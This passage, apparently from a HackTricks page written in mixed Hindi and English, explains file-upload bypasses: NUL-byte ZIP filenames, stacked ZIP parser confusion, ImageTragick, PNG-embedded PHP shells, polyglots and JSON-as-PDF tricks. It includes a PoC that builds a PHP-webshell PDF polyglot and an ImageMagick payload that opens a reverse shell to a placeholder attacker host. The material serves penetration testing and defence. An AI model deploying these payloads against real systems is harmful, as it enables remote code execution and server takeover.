- Validators that rely on ZipArchive will “see” `shell.php .pdf` and allow it; the extractor writes `shell.php` to disk, leading to RCE if the upload folder is executable.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
नोट्स
- Change BOTH filename occurrences (local and central directory). Some tools add an extra data descriptor entry too – adjust all name fields if present.
- payload file को अभी भी server‑side magic/MIME sniffing से पास होना चाहिए। PHP को एक PDF stream में एम्बेड करने से header वैध रहता है।
- यह उन मामलों में काम करता है जहाँ enum/validation path और extraction/write path string handling पर असहमत होते हैं।

### Stacked/concatenated ZIPs (parser disagreement)

दो valid ZIP files को concatenating करने से एक blob बनता है जहाँ अलग-अलग parsers अलग EOCD records पर ध्यान केंद्रित करते हैं। कई tools अंतिम End Of Central Directory (EOCD) को locate करते हैं, जबकि कुछ libraries (e.g., ZipArchive in specific workflows) पहले archive को parse कर सकती हैं जो वे पाती हैं। यदि validation पहले archive को enumerate करता है और extraction किसी दूसरे tool का उपयोग करता है जो अंतिम EOCD का सम्मान करता है, तो एक benign archive checks पास कर सकता है जबकि एक malicious one extract हो सकता है।

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
दुरुपयोग पैटर्न
- एक निष्पाप आर्काइव बनाएँ (अनुमत प्रकार, जैसे PDF) और दूसरा आर्काइव बनाएँ जिसमें अवरुद्ध एक्सटेंशन हो (जैसे `shell.php`)।
- इन्हें जोड़ें: `cat benign.zip evil.zip > combined.zip`।
- यदि सर्वर एक parser के साथ वैधता जांचता है (benign.zip देखता है) लेकिन दूसरे के साथ निकालता है (evil.zip प्रोसेस करता है), तो अवरुद्ध फ़ाइल extraction path में पहुँच जाएगी।

## ImageTragic

इस सामग्री को एक image extension के साथ अपलोड करें ताकि यह कमज़ोरी **(ImageMagick , 7.0.1-1)** का शोषण कर सके (exploit से: [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

PNG फाइल के IDAT chunk में PHP shell एम्बेड करने से कुछ image processing operations को प्रभावी रूप से बाईपास किया जा सकता है। PHP-GD के `imagecopyresized` और `imagecopyresampled` फंक्शन्स इस संदर्भ में खास मायने रखते हैं, क्योंकि इन्हें आम तौर पर images को resize और resample करने के लिए उपयोग किया जाता है। इन ऑपरेशनों से प्रभावित न होने की embedded PHP shell की क्षमता कुछ उपयोग मामलों में महत्वपूर्ण लाभ देती है।

इस तकनीक का विस्तृत विश्लेषण, इसकी methodology और संभावित applications के साथ, निम्नलिखित लेख में दिया गया है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह स्रोत प्रक्रिया और इसके प्रभावों की व्यापक समझ प्रदान करता है।

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files साइबरसिक्योरिटी में एक अनोखा टूल हैं, जो एक समय में कई file formats में वैध रूप से मौजूद हो सकते हैं। एक रोचक उदाहरण एक [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, जो GIF और RAR archive दोनों के रूप में काम करता है। ऐसे फाइल्स केवल इस जोड़ तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसे combinations भी संभव हैं।

Polyglot files की मुख्य उपयोगिता यह है कि वे उन security measures को बायपास कर सकते हैं जो files को type के आधार पर स्क्रीन करते हैं। कई applications में केवल कुछ file types (जैसे JPEG, GIF, या DOC) को upload की अनुमति दी जाती है ताकि संभावित खतरनाक formats (जैसे JS, PHP, या Phar) से बचा जा सके। लेकिन एक polyglot, कई file types की structural शर्तों का पालन करके, इन प्रतिबंधों को चोरी-छुपे बायपास कर सकता है।

फिर भी, polyglots की सीमाएँ होती हैं। उदाहरण के लिए, जबकि एक polyglot एक PHAR file और एक JPEG दोनों का रूप धारण कर सकता है, इसका सफल upload प्लेटफॉर्म की file extension नीतियों पर निर्भर कर सकता है। यदि सिस्टम extensions के बारे में सख्त है, तो polyglot की structural duality ही upload की गारंटी नहीं दे सकती।

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Valid JSON फाइल upload करके file type detections को कैसे रोका जा सकता है, भले ही PDF फाइल बताकर अनुमति न हो (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: जब तक `%PDF` magic bytes पहले 1024 bytes में हैं यह वैध माना जाता है (उदाहरण पोस्ट में देखें)
- **`pdflib` library**: JSON के एक field के अंदर fake PDF format डालें ताकि library इसे pdf समझ ले (उदाहरण पोस्ट में देखें)
- **`file` binary**: यह एक फाइल से up to 1048576 bytes पढ़ सकता है। बस इतनी बड़ी JSON बनाएं कि यह पूरा content parse न कर सके और फिर JSON के अंदर वास्तविक PDF के शुरुआती हिस्से को डाल दें—यह इसे PDF समझ लेगा

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
